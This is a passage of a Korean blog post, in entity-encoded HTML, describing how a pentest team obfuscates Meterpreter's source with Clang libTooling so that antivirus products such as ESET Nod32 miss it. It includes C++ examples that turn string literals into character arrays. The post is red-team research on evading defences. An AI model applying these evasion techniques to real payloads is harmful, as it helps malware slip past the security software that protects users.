&#xC774;&#xB860;&#xC801;&#xC73C;&#xB85C; &#xD0D0;&#xC9C0;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xACE0; &#xC598;&#xAE30;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xC99D;&#xBA85;&#xD558;&#xAE30;&#xAC00; &#xC5B4;&#xB835;&#xB2E4;.</p><p> &#xB610;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; existing foothold&#xC5D0;&#xC11C;&#xB9CC; &#xBC1C;&#xACAC;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xC788;&#xB2E4;. pentester&#xAC00; initial level&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xACBD;&#xC6B0; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC2E4;&#xC81C; &#xBCF4;&#xC548; &#xC0C1;&#xD0DC;&#xB97C; &#xB3C4;&#xCD9C;&#xD560; &#xC218; &#xC5C6;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC6B0;&#xD68C;&#xB294; &#xD544;&#xC694;&#xD558;&#xB2E4;. SCRT(&#xD544;&#xC790;&#xC758; &#xD300;)&#xC5D0;&#xC11C;&#xB294; &#xACF5;&#xAC1C;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xD234;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD234;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xC219;&#xB828;&#xB41C; &#xB204;&#xAD6C;&#xB098; &#xB530;&#xB77C; &#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; private &#xD558;&#xACE0; &#xBE44;&#xC2FC; &#xD234;&#xC5D0; &#xC758;&#xC874;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xB41C;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xAC15;&#xC870;&#xD55C;&#xB2E4;.</p><h1 id="&#xBB38;&#xC81C;&#xC810;"><a href="#&#xBB38;&#xC81C;&#xC810;" class="headerlink" title="&#xBB38;&#xC81C;&#xC810;"></a>&#xBB38;&#xC81C;&#xC810;</h1><p>&#xC0AC;&#xB78C;&#xB4E4;&#xC740; &#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xC758; &#xD0D0;&#xC9C0;&#xAC00; &#xC815;&#xC801;&#xC778;&#xC9C0; &#xB3D9;&#xC801;&#xC778;&#xC9C0; &#xBD84;&#xB958;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC88B;&#xC544;&#xD55C;&#xB2E4;. &#xBCF4;&#xD1B5; &#xC2E4;&#xD589; &#xC804;&#xC5D0; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xBA74; &#xC815;&#xC801; &#xD0D0;&#xC9C0;&#xB85C; &#xAC04;&#xC8FC;&#xB41C;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC0DD;&#xC131;, in-memory file downloads &#xAC19;&#xC740; &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xBA40;&#xC6E8;&#xC5B4; &#xC2E4;&#xD589; &#xC2DC; signature&#xC640; &#xAC19;&#xC740; &#xC815;&#xC801; &#xD0D0;&#xC9C0; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC774; &#xD638;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC740; &#xC544;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xB2E4;. &#xBAA8;&#xB4E0; &#xBCF4;&#xC548; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0; Meterpreter&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB824;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><ul><li>&#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xC2A4;&#xCE94; &#xD639;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xC2A4;&#xCE94; &#xC911;&#xC5D0; &#xBAA8;&#xB4E0; static signature &#xC6B0;&#xD68C;</li><li>userland API hooking &#xC6B0;&#xD68C;&#xC640; &#xAD00;&#xB828;&#xB41C; &#x201C;&#xD589;&#xB3D9; &#xD0D0;&#xC9C0;&#x201D; &#xC6B0;&#xD68C;</li></ul><p>Meterpreter&#xB294; &#xC5EC;&#xB7EC; &#xBAA8;&#xB4C8;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xBA70; &#xC804;&#xCCB4; &#xCF54;&#xB4DC; &#xBCA0;&#xC774;&#xC2A4;&#xC758; &#xC591;&#xC774; &#xB9CE;&#xACE0; &#xACC4;&#xC18D; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xBBC0;&#xB85C; private fork&#xB97C; &#xC218;&#xD589;&#xD558;&#xAE30; &#xD798;&#xB4E4;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xCF54;&#xB4DC; &#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xC218;&#xC815;&#xD560; &#xBC29;&#xBC95;&#xC774; &#xD544;&#xC694;&#xD558;&#xB2E4;.</p><h1 id="&#xD574;&#xACB0;-&#xBC29;&#xC548;"><a href="#&#xD574;&#xACB0;-&#xBC29;&#xC548;" class="headerlink" title="&#xD574;&#xACB0; &#xBC29;&#xC548;"></a>&#xD574;&#xACB0; &#xBC29;&#xC548;</h1><p>&#xBA40;&#xC6E8;&#xC5B4; &#xD0D0;&#xC9C0;&#xB294; &#xB300;&#xBD80;&#xBD84; &#xBB38;&#xC790;&#xC5F4;, API hook, &#xD639;&#xC740; &#xB458;&#xC758; &#xC870;&#xD569;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C;&#xB2E4;.</p><p>Cylance &#xAC19;&#xC740; &#xBA38;&#xC2E0;&#xB7EC;&#xB2DD; classifier&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xB294; &#xC81C;&#xD488;&#xC5D0;&#xC11C;&#xB3C4; &#xBB38;&#xC790;&#xC5F4;, API import, &#xD6C4;&#xD0B9; &#xD560; &#xC218; &#xC788;&#xB294; API &#xD638;&#xCD9C;&#xC774; &#xC5C6;&#xB294; &#xBA40;&#xC6E8;&#xC5B4;&#xB294; &#xD0D0;&#xC9C0;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>Meterpreter&#xB294; &#xC218;&#xCC9C; &#xAC1C;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xACE0; API imports&#xB294; &#xC5B4;&#xB5A0;&#xD55C; &#xBC29;&#xBC95;&#xC73C;&#xB85C;&#xB3C4; &#xC228;&#xACA8;&#xC9C0;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; <code>WriteProcessMemory</code> &#xAC19;&#xC740; &#xBBFC;&#xAC10;&#xD55C; API&#xB294; userland API hook&#xC73C;&#xB85C; &#xC27D;&#xAC8C; intercept &#xD560; &#xC218; &#xC788;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC790;&#xB3D9;&#xD654;&#xB41C; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; 2&#xAC1C;&#xC758; &#xC194;&#xB8E8;&#xC158;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;.</p><ul><li>Source-to-source code refactoring</li><li>LLVM &#xCEF4;&#xD30C;&#xC77C; &#xC2DC; &#xCF54;&#xB4DC; &#xBCA0;&#xC774;&#xC2A4; &#xB09C;&#xB3C5;&#xD654;</li></ul><p>&#xD6C4;&#xC790;&#xAC00; &#xC120;&#xD638;&#xB418;&#xB294; &#xBC29;&#xC2DD;&#xC774;&#xBA70; &#xB9CE;&#xC740; &#xC720;&#xBA85;&#xD55C; &#xC5F0;&#xAD6C;&#xB4E4;&#xC5D0;&#xC11C; &#xAC19;&#xC740; &#xACB0;&#xB860;&#xC5D0; &#xB3C4;&#xB2EC;&#xD588;&#xB2E4;. transformation pass&#xB97C; &#xD55C; &#xBC88; &#xC791;&#xC131;&#xD574;&#xC11C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC758; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC5B8;&#xC5B4;&#xB098; target architecture&#xC5D0; &#xC0C1;&#xAD00;&#xC5C6;&#xC774; &#xC7AC;&#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xB2E4;.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/0.png" alt></p><p>&#xC774;&#xBBF8;&#xC9C0; &#xCD9C;&#xCC98;: <a href="http://www.aosabook.org/en/llvm.html">http://www.aosabook.org/en/llvm.html</a></p><p>&#xADF8;&#xB7EC;&#xB098; &#xC774; &#xBC29;&#xBC95;&#xC740; Visual Studio&#xAC00; &#xC544;&#xB2CC; &#xB2E4;&#xB978; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB85C; Meterpreter&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;. &#xC774;&#xB97C; &#xC218;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; 2018&#xB144; 12&#xC6D4;&#xC5D0; &#xBA87; &#xAC00;&#xC9C0; &#xC791;&#xC5C5;&#xC744; &#xD37C;&#xBE14;&#xB9AC;&#xC2DC;&#xD588;&#xC9C0;&#xB9CC; 1&#xB144;&#xC774; &#xB354; &#xC9C0;&#xB09C; &#xC9C0;&#xAE08;&#xB3C4; &#xACF5;&#xC2DD; &#xCF54;&#xB4DC; &#xBCA0;&#xC774;&#xC2A4;&#xC5D0; &#xC801;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;.</p><p>&#xADF8;&#xB3D9;&#xC548; &#xC6B0;&#xB9AC;&#xB294; &#xCCAB; &#xBC88;&#xC9F8; &#xC811;&#xADFC;&#xBC95;&#xC744; &#xAD6C;&#xD604;&#xD558;&#xAE30;&#xB85C; &#xACB0;&#xC815;&#xD588;&#xB2E4;. &#xCD5C;&#xCCA8;&#xB2E8; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC; refactoring&#xB97C; &#xC0B4;&#xD3B4;&#xBCF8; &#xACB0;&#xACFC; <em>libTooling</em>(Clang/LLVM toolchain&#xC758; &#xC77C;&#xBD80;)&#xC774; C/C++ &#xC18C;&#xC2A4;&#xC758; &#xAD6C;&#xBB38; &#xBD84;&#xC11D;&#xACFC; &#xC218;&#xC815;&#xC5D0; &#xAC00;&#xC7A5; &#xC801;&#xD569;&#xD588;&#xB2E4;.</p><p>Note: &#xCF54;&#xB4DC; &#xBCA0;&#xC774;&#xC2A4;&#xB294; Visual Studio &#xC758;&#xC874;&#xC131;&#xC774; &#xAC15;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Clang&#xC740; Meterpreter&#xC758; &#xB9CE;&#xC740; &#xBD80;&#xBD84;&#xC758; &#xAD6C;&#xBB38; &#xBD84;&#xC11D;&#xC5D0; &#xC2E4;&#xD328;&#xD560; &#xAC83;&#xC774;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xD0C0;&#xAC9F; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xB97C; 50% &#xD655;&#xB960;&#xB85C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB2E4;. &#xB610;&#xD55C; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xBCC0;&#xD658;&#xD558;&#xB294; &#xAC83;&#xC774; &#xCEF4;&#xD30C;&#xC77C; &#xC2DC;&#xC5D0; &#xBCC0;&#xD658;&#xD558;&#xB294; &#xAC83;&#xBCF4;&#xB2E4; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xC744; &#xAC83;&#xC774;&#xB2E4;. &#xD6C4;&#xC790;&#xB294; &#xC5D0;&#xB7EC; &#xC5C6;&#xC774; &#xC804;&#xCCB4; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD574;&#xC57C; &#xD558;&#xC9C0;&#xB9CC; &#xC804;&#xC790;&#xB294; &#xC218;&#xCC9C; &#xAC1C;&#xC758; &#xCEF4;&#xD30C;&#xC77C; &#xC5D0;&#xB7EC;&#xC5D0; &#xD0C4;&#xB825;&#xC801;&#xC774;&#xBA70; &#xBD88;&#xC644;&#xC804;&#xD55C; &#xCD94;&#xC0C1; &#xAD6C;&#xBB38; &#xD2B8;&#xB9AC;&#xB85C; &#xB05D;&#xC774; &#xB09C;&#xB2E4;.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/1.png" alt></p><p>LLVM passes vs libTooling</p><h2 id="&#xBB38;&#xC790;&#xC5F4;-&#xB09C;&#xB3C5;&#xD654;"><a href="#&#xBB38;&#xC790;&#xC5F4;-&#xB09C;&#xB3C5;&#xD654;" class="headerlink" title="&#xBB38;&#xC790;&#xC5F4; &#xB09C;&#xB3C5;&#xD654;"></a>&#xBB38;&#xC790;&#xC5F4; &#xB09C;&#xB3C5;&#xD654;</h2><p>C/C++&#xC5D0;&#xC11C; &#xBB38;&#xC790;&#xC5F4;&#xC740; &#xB2E4;&#xC591;&#xD55C; context &#xC548;&#xC5D0; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;.</p><p><em>libTooling</em>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC740; &#xBCF5;&#xC7A1;&#xD558;&#xBBC0;&#xB85C; Meterpreter&#xC758; &#xCF54;&#xB4DC; &#xBCA0;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xB098;&#xD0C0;&#xB098;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><ul><li>function arguments</li><li>list initializers</li></ul><h3 id="Fcuntion-arguments"><a href="#Fcuntion-arguments" class="headerlink" title="Fcuntion arguments"></a>Fcuntion arguments</h3><p>ESET Nod32&#xB294; &#xB2E4;&#xC74C; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>ntdll</code> &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xD0D0;&#xC9C0;&#xD55C;&#xB2E4;.</p><pre><code class="hljs cpp">ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))</code></pre><p>&#xADF8;&#xB7EC;&#xB098; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xCF54;&#xB4DC;&#xB97C; &#xC7AC;&#xC791;&#xC131;&#xD558;&#xBA74; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xD0D0;&#xC9C0;&#xB97C; &#xC6B0;&#xD68C;&#xD55C;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> ntdll_str[] = {<span class="hljs-string">&apos;n&apos;</span>, <span class="hljs-string">&apos;t&apos;</span>, <span class="hljs-string">&apos;d&apos;</span>, <span class="hljs-string">&apos;l&apos;</span>, <span class="hljs-string">&apos;l&apos;</span>, <span class="hljs-number">0</span>};ntdll = LoadLibrary(ntdll_str)</code></pre><p>&#xCCAB; &#xBC88;&#xC9F8; &#xCF54;&#xB4DC;&#xB294; <code>.rdata</code> &#xC139;&#xC158;&#xC5D0; <code>&quot;ntdll&quot;</code> &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC800;&#xC7A5;&#xB3FC;&#xC11C; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xC5D0;&#xAC8C; &#xC27D;&#xAC8C; &#xBC1C;&#xACAC;&#xB41C;&#xB2E4;. &#xB450; &#xBC88;&#xC9F8; &#xCF54;&#xB4DC;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC2E4;&#xD589; &#xC2DC; &#xC2A4;&#xD0DD;&#xC5D0; &#xC800;&#xC7A5;&#xB3FC;&#xC11C; &#xBCF4;&#xD1B5; &#xC815;&#xC801;&#xC73C;&#xB85C; &#xAD6C;&#xBD84;&#xD560; &#xC218; &#xC5C6;&#xB2E4;. <em>IDA Pro</em>&#xC640; &#xAC19;&#xC740; &#xD234;&#xC5D0;&#xC11C;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD0D0;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB354; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><h3 id="List-initializers"><a href="#List-initializers" class="headerlink" title="List initializers"></a>List initializers</h3><p>Meterpreter&#xC758; &#xCF54;&#xB4DC; &#xBCA0;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAD6C;&#xC131;&#xC740; <a href="https://github.com/rapid7/metasploit-payloads/blob/c8aa435b3c4872c58dba04acf53d157c3de2771c/c/meterpreter/source/extensions/extapi/extapi.c#L23">c/meterpreter/source/extensions/extapi/extapi.c</a>&#xC640; &#xAC19;&#xC740; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp">Command customCommands[] ={    COMMAND_REQ(<span class="hljs-string">&quot;extapi_window_enum&quot;</span>, request_window_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_enum&quot;</span>, request_service_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_query&quot;</span>, request_service_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_control&quot;</span>, request_service_control),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_get_data&quot;</span>, request_clipboard_get_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_set_data&quot;</span>, request_clipboard_set_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_start&quot;</span>, request_clipboard_monitor_start),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_pause&quot;</span>, request_clipboard_monitor_pause),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_resume&quot;</span>, request_clipboard_monitor_resume),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_purge&quot;</span>, request_clipboard_monitor_purge),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_stop&quot;</span>, request_clipboard_monitor_stop),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_dump&quot;</span>, request_clipboard_monitor_dump),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_adsi_domain_query&quot;</span>, request_adsi_domain_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_ntds_parse&quot;</span>, ntds_parse),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_wmi_query&quot;</span>, request_wmi_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_pageant_send_query&quot;</span>, request_pageant_send_query),    ...}</code></pre><p>&#xC774; &#xBB38;&#xC790;&#xC5F4;&#xB4E4;&#xC740; <code>ext_server_espia_x64.dll</code>&#xC758; <code>.rdata</code> &#xC601;&#xC5ED;&#xC5D0; &#xD3C9;&#xBB38;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xACE0; <em>ESET Nod32</em>&#xC5D0;&#xC11C; &#xD0D0;&#xC9C0;&#xB41C;&#xB2E4;.</p><p>&#xC774; &#xBB38;&#xC790;&#xC5F4;&#xB4E4;&#xC740; list initialzier&#xC5D0; &#xC704;&#xCE58;&#xD55C; &#xB9E4;&#xD06C;&#xB85C;&#xC758; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xC774;&#xB2E4;. &#xBAA9;&#xD45C;&#xB294; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC704;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC7AC;&#xC791;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">char</span> hid_extapi_UQOoNXigAPq4[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;w&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;w&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;u&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_vhFHmZ8u2hfz[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;v&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;u&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_pW25eeIGBeru[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;v&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;q&apos;</span>,<span class="hljs-string">&apos;u&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;y&apos;</span><span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_S4Ws57MYBjib[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;v&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;n&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;r&apos;</span><span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;l&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_HJ0lD9Dl56A4[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;l&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;b&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;g&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;t&apos;</span><span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_IiEzXils3UsR[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;l&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;b&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;t&apos;</span><span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_czLOBo0HcqCP[] = {<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;l&apos;</span>,<span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;p&apos;</span>,<span class="hljs-string">&apos;b&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;m&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;n&apos;</span><span class="hljs-string">&apos;i&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;_&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;t&apos;</span>,<span class="hljs-number">0</span>};<span class="hljs-keyword">char</span> hid_extapi_WcWbTrsQujiT[] = {<span class="hljs-string">&apos;e&apos;</span>,<span 